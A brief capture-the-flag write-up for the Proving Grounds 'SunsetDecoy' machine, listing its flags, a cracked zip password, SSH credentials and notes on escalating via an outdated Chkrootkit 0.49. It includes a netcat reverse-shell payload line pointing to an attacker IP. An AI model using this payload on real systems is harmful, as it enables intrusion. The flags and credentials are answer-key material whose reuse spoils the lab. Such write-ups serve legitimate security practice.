# Proving Grounds SunsetDecoy

> Saikat Karmakar | Mar 17:2021

```
ip = 192.168.224.85
```
-------------------------------------------------------------------------------

1. user flag
```
8e7d3405cd1a0ddaf0c427d0f508d080
```
2. root flag
```
14139500b734f4bebb0dd7fa9f5d8861
```



--
-----------
***Notes***
----------
cracked zip pass : manuel

ssh creds
```
296640a3b825115a47b68fc44501c828 : server
```
run pspy64

got a outdated program running Chkrootkit 0.49
https://www.exploit-db.com/exploits/33899

>payload
	echo "/usr/bin/nc -e /bin/sh 192.168.49.224 4444" > update 
	run the bin honeypot.decoy
	select the av scan
	get the shell


